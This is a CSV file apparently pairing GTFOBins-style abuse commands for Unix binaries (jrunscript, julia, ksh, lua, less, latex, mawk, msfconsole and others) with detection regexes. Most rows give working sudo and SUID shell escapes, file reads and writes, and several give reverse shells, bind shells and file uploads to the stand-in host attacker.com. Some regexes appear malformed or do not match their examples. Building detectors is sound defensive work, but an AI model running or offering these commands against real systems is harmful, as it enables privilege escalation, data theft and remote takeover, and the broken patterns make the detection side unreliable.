Name,Function,ExampleCode,Regex
jrunscript,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
jrunscript -e 'var host='""'""""$RHOST""""'""'; var port='""$RPORT""';
var p=new java.lang.ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start();
var s=new java.net.Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();po.flush();
java.lang.Thread.sleep(50);
try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'",(?i)(?:sudo\s+)?(?:\S*/)?jrunscript\s*\-e\s+.*/bin/bash.*socket)
jrunscript,file-download,"jrunscript -e ""cp('$URL','$LFILE')""",(?i)(?:sudo\s+)?(?:\S*/)?jrunscript\s*\-e\s+.*)
jrunscript,file-write,"jrunscript -e 'var fw=new java.io.FileWriter(""./file_to_write""); fw.write(""DATA""); fw.close();'",(?i)(?:sudo\s+)?(?:\S*/)?jrunscript\s*\-e\s+.*)
jrunscript,file-read,"jrunscript -e 'br = new BufferedReader(new java.io.FileReader(""file_to_read"")); while ((line = br.readLine()) != null) { print(line); }'",(?i)(?:sudo\s+)?(?:\S*/)?jrunscript\s*\-e\s+.*)
jrunscript,suid,"./jrunscript -e ""exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')""","(?i)(?:sudo\s+)?(?:\S*/)?jrunscript\s*\-e\s*\-p\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
jrunscript,sudo,"sudo jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""","(?i)(?:sudo\s+)?(?:\S*/)?jrunscript\s*\-e\s*\-c\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
jtag,shell,"jtag --interactive
shell /bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?jtag\s+.*/bin/sh)
jtag,sudo,"sudo jtag --interactive
shell /bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?jtag\s+.*/bin/sh)
julia,shell,julia -e 'run(`/bin/sh`)',(?i)(?:sudo\s+)?(?:\S*/)?julia\s*\-e\s+.*/bin/sh)
julia,file-read,"export LFILE=file_to_read
julia -e 'print(open(f->read(f, String), ENV[""LFILE""]))'",(?i)(?:sudo\s+)?(?:\S*/)?julia\s*\-e\s+.*)
julia,file-write,"export LFILE=file_to_write
julia -e 'open(f->write(f, ""DATA""), ENV[""LFILE""], ""w"")'",(?i)(?:sudo\s+)?(?:\S*/)?julia\s*\-e\s+.*)
julia,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
julia -e 'download(ENV[""URL""], ENV[""LFILE""])'",(?i)(?:sudo\s+)?(?:\S*/)?julia\s*\-e\s+.*)
julia,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
julia -e 'using Sockets; sock=connect(ENV[""RHOST""], parse(Int64,ENV[""RPORT""])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'",(?i)(?:sudo\s+)?(?:\S*/)?julia\s*\-e\s+.*socket)
julia,suid,./julia -e 'run(`/bin/sh -p`)',(?i)(?:sudo\s+)?(?:\S*/)?julia\s*\-e\s*\-p\s+.*/bin/sh)
julia,sudo,sudo julia -e 'run(`/bin/sh`)',(?i)(?:sudo\s+)?(?:\S*/)?julia\s*\-e\s+.*/bin/sh)
knife,shell,"knife exec -E 'exec ""/bin/sh""'",(?i)(?:sudo\s+)?(?:\S*/)?knife\s*\-E\s+.*/bin/sh)
knife,sudo,"sudo knife exec -E 'exec ""/bin/sh""'",(?i)(?:sudo\s+)?(?:\S*/)?knife\s*\-E\s+.*/bin/sh)
ksh,shell,ksh,(?i)(?:sudo\s+)?(?:\S*/)?ksh\s+.*)
ksh,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'",(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-c\s*\-i\s+.*)
ksh,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
ksh -c 'echo -e ""POST / HTTP/0.9\n\n$(cat $LFILE)"" > /dev/tcp/$RHOST/$RPORT'",(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-c\s*\-e\s+.*)
ksh,file-upload,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'",(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-c\s+.*)
ksh,file-download,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
ksh -c '{ echo -ne ""GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n"" 1>&3; cat 0<&3; } \
3<>/dev/tcp/$RHOST/$RPORT \
| { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } > $LFILE'",(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-c\s*\-r\s+.*)
ksh,file-download,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'",(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-c\s+.*)
ksh,file-write,"export LFILE=file_to_write
ksh -c 'echo DATA > $LFILE'",(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-c\s+.*)
ksh,file-read,"export LFILE=file_to_read
ksh -c 'echo ""$(<$LFILE)""'",(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-c\s+.*)
ksh,file-read,"export LFILE=file_to_read
ksh -c $'read -r -d \x04 < ""$LFILE""; echo ""$REPLY""'",(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-c\s*\-r\s*\-d\s+.*)
ksh,suid,./ksh -p,(?i)(?:sudo\s+)?(?:\S*/)?ksh\s*\-p\s+.*)
ksh,sudo,sudo ksh,(?i)(?:sudo\s+)?(?:\S*/)?ksh\s+.*)
ksshell,file-read,ksshell -i $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?ksshell\s*\-i\s+.*)
ksshell,suid,./ksshell -i $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?ksshell\s*\-i\s+.*)
ksshell,sudo,sudo ksshell -i $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?ksshell\s*\-i\s+.*)
ksu,sudo,sudo ksu -q -e /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?ksu\s*\-q\s*\-e\s+.*/bin/sh)
kubectl,file-upload,kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/,(?i)(?:sudo\s+)?(?:\S*/)?kubectl\s+.*)
kubectl,suid,./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/,(?i)(?:sudo\s+)?(?:\S*/)?kubectl\s+.*)
kubectl,sudo,sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/,(?i)(?:sudo\s+)?(?:\S*/)?kubectl\s+.*)
latex,shell,latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?i)(?:sudo\s+)?(?:\S*/)?latex\s+.*/bin/sh.*BEGIN)
latex,file-read,"latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi",(?i)(?:sudo\s+)?(?:\S*/)?latex\s+.*BEGIN)
latex,sudo,"sudo latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi",(?i)(?:sudo\s+)?(?:\S*/)?latex\s+.*BEGIN)
latex,sudo,sudo latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?i)(?:sudo\s+)?(?:\S*/)?latex\s+.*/bin/sh.*BEGIN)
latex,limited-suid,./latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',(?i)(?:sudo\s+)?(?:\S*/)?latex\s+.*/bin/sh.*BEGIN)
latexmk,shell,"latexmk -e 'exec ""/bin/sh"";'",(?i)(?:sudo\s+)?(?:\S*/)?latexmk\s*\-e\s+.*/bin/sh)
latexmk,shell,latexmk -latex='/bin/sh #' /dev/null,(?i)(?:sudo\s+)?(?:\S*/)?latexmk\s+.*/bin/sh)
latexmk,file-read,"latexmk -e 'open(X,""/etc/passwd"");while(<X>){print $_;}exit'",(?i)(?:sudo\s+)?(?:\S*/)?latexmk\s*\-e\s+.*)
latexmk,file-read,"echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' >$TF
strings tmp.dvi",(?i)(?:sudo\s+)?(?:\S*/)?latexmk\s+.*BEGIN)
latexmk,sudo,"sudo latexmk -e 'exec ""/bin/sh"";'",(?i)(?:sudo\s+)?(?:\S*/)?latexmk\s*\-e\s+.*/bin/sh)
ld.so,shell,/lib/ld.so /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?ld\.so\s+.*/bin/sh)
ld.so,suid,./ld.so /bin/sh -p,(?i)(?:sudo\s+)?(?:\S*/)?ld\.so\s*\-p\s+.*/bin/sh)
ld.so,sudo,sudo /lib/ld.so /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?ld\.so\s+.*/bin/sh)
ldconfig,sudo,"echo ""$TF"" > ""$TF/conf""
sudo ldconfig -f ""$TF/conf""",(?i)(?:sudo\s+)?(?:\S*/)?ldconfig\s*\-f\s+.*)
ldconfig,limited-suid,"echo ""$TF"" > ""$TF/conf""
./ldconfig -f ""$TF/conf""",(?i)(?:sudo\s+)?(?:\S*/)?ldconfig\s*\-f\s+.*)
less,shell,"less /etc/profile
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?less\s+.*/bin/sh)
less,shell,v,(?i)(?:sudo\s+)?(?:\S*/)?less\s+.*)
less,shell,"less /etc/profile
v:shell",(?i)(?:sudo\s+)?(?:\S*/)?less\s+.*)
less,file-read,less file_to_read,(?i)(?:sudo\s+)?(?:\S*/)?less\s+.*)
less,file-read,"less /etc/profile
:e file_to_read",(?i)(?:sudo\s+)?(?:\S*/)?less\s+.*)
less,file-write,"echo DATA | less
sfile_to_write
q",(?i)(?:sudo\s+)?(?:\S*/)?less\s+.*)
less,file-write,"less file_to_write
v",(?i)(?:sudo\s+)?(?:\S*/)?less\s+.*)
less,sudo,"sudo less /etc/profile
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?less\s+.*/bin/sh)
less,suid,./less file_to_read,(?i)(?:sudo\s+)?(?:\S*/)?less\s+.*)
lftp,shell,lftp -c '!/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?lftp\s*\-c\s+.*/bin/sh)
lftp,limited-suid,./lftp -c '!/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?lftp\s*\-c\s+.*/bin/sh)
lftp,sudo,sudo lftp -c '!/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?lftp\s*\-c\s+.*/bin/sh)
links,file-read,"links ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?links\s+.*)
links,suid,"./links ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?links\s+.*)
links,sudo,"sudo links ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?links\s+.*)
ln,sudo,"sudo ln -fs /bin/sh /bin/ln
sudo ln",(?i)(?:sudo\s+)?(?:\S*/)?ln\s+.*/bin/sh)
loginctl,shell,"loginctl user-status
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?loginctl\s+.*/bin/sh)
loginctl,sudo,"sudo loginctl user-status
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?loginctl\s+.*/bin/sh)
logsave,shell,logsave /dev/null /bin/sh -i,(?i)(?:sudo\s+)?(?:\S*/)?logsave\s*\-i\s+.*/bin/sh)
logsave,sudo,sudo logsave /dev/null /bin/sh -i,(?i)(?:sudo\s+)?(?:\S*/)?logsave\s*\-i\s+.*/bin/sh)
logsave,suid,./logsave /dev/null /bin/sh -i -p,(?i)(?:sudo\s+)?(?:\S*/)?logsave\s*\-i\s*\-p\s+.*/bin/sh)
look,file-read,"look '' ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?look\s+.*)
look,suid,"./look '' ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?look\s+.*)
look,sudo,"sudo look '' ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?look\s+.*)
lp,file-upload,lp $LFILE -h $RHOST,(?i)(?:sudo\s+)?(?:\S*/)?lp\s*\-h\s+.*)
ltrace,file-read,ltrace -F $LFILE /dev/null,(?i)(?:sudo\s+)?(?:\S*/)?ltrace\s*\-F\s+.*)
ltrace,file-write,ltrace -s 999 -o $LFILE ltrace -F DATA,(?i)(?:sudo\s+)?(?:\S*/)?ltrace\s*\-s\s*\-o\s*\-F\s+.*)
ltrace,shell,ltrace -b -L /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?ltrace\s*\-b\s*\-L\s+.*/bin/sh)
ltrace,sudo,sudo ltrace -b -L /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?ltrace\s*\-b\s*\-L\s+.*/bin/sh)
lua,shell,"lua -e 'os.execute(""/bin/sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+.*/bin/sh)
lua,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
lua -e 'local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
while true do
local r,x=t:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));t:send(b);
end;
f:close();t:close();'","(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
lua,non-interactive-bind-shell,"export LPORT=12345
lua -e 'local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,""r""));
local b=assert(f:read(""*a""));c:send(b);
end;c:close();f:close();'","(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
lua,file-upload,"lua -e '
local f=io.open(os.getenv(""LFILE""), 'rb')
local d=f:read(""*a"")
io.close(f);
local s=require(""socket"");
local t=assert(s.tcp());
t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));
t:send(d);
t:close();'","(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
lua,file-download,"export LPORT=12345
export LFILE=file_to_save
lua -e 'local k=require(""socket"");
local s=assert(k.bind(""*"",os.getenv(""LPORT"")));
local c=s:accept();
local d,x=c:receive(""*a"");
c:close();
local f=io.open(os.getenv(""LFILE""), ""wb"");
f:write(d);
io.close(f);'","(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
lua,file-write,"lua -e 'local f=io.open(""file_to_write"", ""wb""); f:write(""DATA""); io.close(f);'",(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+.*)
lua,file-read,"lua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'",(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+.*)
lua,suid,"lua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'",(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+.*)
lua,sudo,"sudo lua -e 'os.execute(""/bin/sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+.*/bin/sh)
lua,limited-suid,"./lua -e 'os.execute(""/bin/sh"")'",(?i)(?:sudo\s+)?(?:\S*/)?lua\s*\-e\s+.*/bin/sh)
lualatex,shell,"lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'",(?i)(?:sudo\s+)?(?:\S*/)?lualatex\s+.*/bin/sh.*BEGIN)
lualatex,sudo,"sudo lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'",(?i)(?:sudo\s+)?(?:\S*/)?lualatex\s+.*/bin/sh.*BEGIN)
lualatex,limited-suid,"./lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'",(?i)(?:sudo\s+)?(?:\S*/)?lualatex\s+.*/bin/sh.*BEGIN)
luatex,shell,"luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'",(?i)(?:sudo\s+)?(?:\S*/)?luatex\s+.*/bin/sh)
luatex,sudo,"sudo luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'",(?i)(?:sudo\s+)?(?:\S*/)?luatex\s+.*/bin/sh)
luatex,limited-suid,"./luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'",(?i)(?:sudo\s+)?(?:\S*/)?luatex\s+.*/bin/sh)
lwp-download,file-download,lwp-download $URL $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?lwp\-download\s+.*)
lwp-download,sudo,sudo lwp-download $URL $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?lwp\-download\s+.*)
lwp-download,file-read,"lwp-download ""file://$LFILE"" $TF
cat $TF",(?i)(?:sudo\s+)?(?:\S*/)?lwp\-download\s+.*)
lwp-download,file-write,"echo DATA >$TF
lwp-download file://$TF $LFILE",(?i)(?:sudo\s+)?(?:\S*/)?lwp\-download\s+.*)
lwp-request,file-read,"lwp-request ""file://$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?lwp\-request\s+.*)
lwp-request,sudo,"sudo lwp-request ""file://$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?lwp\-request\s+.*)
mail,shell,mail --exec='!/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?mail\s+.*/bin/sh)
mail,shell,"echo ""From nobody@localhost $(date)"" > $TF
mail -f $TF
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?mail\s*\-f\s+.*/bin/sh)
mail,sudo,sudo mail --exec='!/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?mail\s+.*/bin/sh)
make,shell,"make -s --eval=$'x:\n\t-'""$COMMAND""",(?i)(?:sudo\s+)?(?:\S*/)?make\s*\-s\s+.*)
make,file-write,"make -s --eval=""\$(file >$LFILE,DATA)"" .",(?i)(?:sudo\s+)?(?:\S*/)?make\s*\-s\s+.*)
make,suid,"./make -s --eval=$'x:\n\t-'""$COMMAND""",(?i)(?:sudo\s+)?(?:\S*/)?make\s*\-s\s+.*)
make,sudo,"sudo make -s --eval=$'x:\n\t-'""$COMMAND""",(?i)(?:sudo\s+)?(?:\S*/)?make\s*\-s\s+.*)
man,shell,"man man
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?man\s+.*/bin/sh)
man,shell,man '-H/bin/sh #' man,(?i)(?:sudo\s+)?(?:\S*/)?man\s+.*/bin/sh)
man,file-read,man file_to_read,(?i)(?:sudo\s+)?(?:\S*/)?man\s+.*)
man,sudo,"sudo man man
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?man\s+.*/bin/sh)
mawk,shell,"mawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:sudo\s+)?(?:\S*/)?mawk\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*BEGIN)"
mawk,file-write,"mawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'",(?i)(?:sudo\s+)?(?:\S*/)?mawk\s*\-v\s+.*BEGIN)
mawk,file-read,"mawk '//' ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?mawk\s+.*)
mawk,suid,"./mawk '//' ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?mawk\s+.*)
mawk,sudo,"sudo mawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:sudo\s+)?(?:\S*/)?mawk\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*BEGIN)"
mawk,limited-suid,"./mawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:sudo\s+)?(?:\S*/)?mawk\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*BEGIN)"
minicom,shell,minicom -D /dev/null,(?i)(?:sudo\s+)?(?:\S*/)?minicom\s*\-D\s+.*)
minicom,shell,"echo ""! exec /bin/sh <$(tty) 1>$(tty) 2>$(tty)"" >$TF
minicom -D /dev/null -S $TF
reset^J",(?i)(?:sudo\s+)?(?:\S*/)?minicom\s*\-D\s*\-S\s+.*/bin/sh)
minicom,sudo,sudo minicom -D /dev/null,(?i)(?:sudo\s+)?(?:\S*/)?minicom\s*\-D\s+.*)
minicom,suid,./minicom -D /dev/null,(?i)(?:sudo\s+)?(?:\S*/)?minicom\s*\-D\s+.*)
more,shell,!/bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?more\s+.*/bin/sh)
more,file-read,more file_to_read,(?i)(?:sudo\s+)?(?:\S*/)?more\s+.*)
more,suid,./more file_to_read,(?i)(?:sudo\s+)?(?:\S*/)?more\s+.*)
more,sudo,!/bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?more\s+.*/bin/sh)
mosquitto,file-read,"mosquitto -c ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?mosquitto\s*\-c\s+.*)
mosquitto,suid,"./mosquitto -c ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?mosquitto\s*\-c\s+.*)
mosquitto,sudo,"sudo mosquitto -c ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?mosquitto\s*\-c\s+.*)
mount,sudo,"sudo mount -o bind /bin/sh /bin/mount
sudo mount",(?i)(?:sudo\s+)?(?:\S*/)?mount\s*\-o\s+.*/bin/sh)
msfconsole,shell,"sudo msfconsole
msf6 > irb
>> system(""/bin/sh"")","(?i)(?:sudo\s+)?(?:\S*/)?msfconsole\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
msfconsole,sudo,"sudo msfconsole
msf6 > irb
>> system(""/bin/sh"")","(?i)(?:sudo\s+)?(?:\S*/)?msfconsole\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
msgattrib,file-read,msgattrib -P $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?msgattrib\s*\-P\s+.*)
msgattrib,sudo,sudo msgattrib -P $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?msgattrib\s*\-P\s+.*)
msgattrib,suid,./msgattrib -P $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?msgattrib\s*\-P\s+.*)
msgcat,file-read,msgcat -P $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?msgcat\s*\-P\s+.*)
msgcat,sudo,sudo msgcat -P $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?msgcat\s*\-P\s+.*)
msgcat,suid,./msgcat -P $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?msgcat\s*\-P\s+.*)
msgconv,file-read,msgconv -P $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?msgconv\s*\-P\s+.*)
msgconv,sudo,sudo msgconv -P $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?msgconv\s*\-P\s+.*)
msgconv,suid,./msgconv -P $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?msgconv\s*\-P\s+.*)
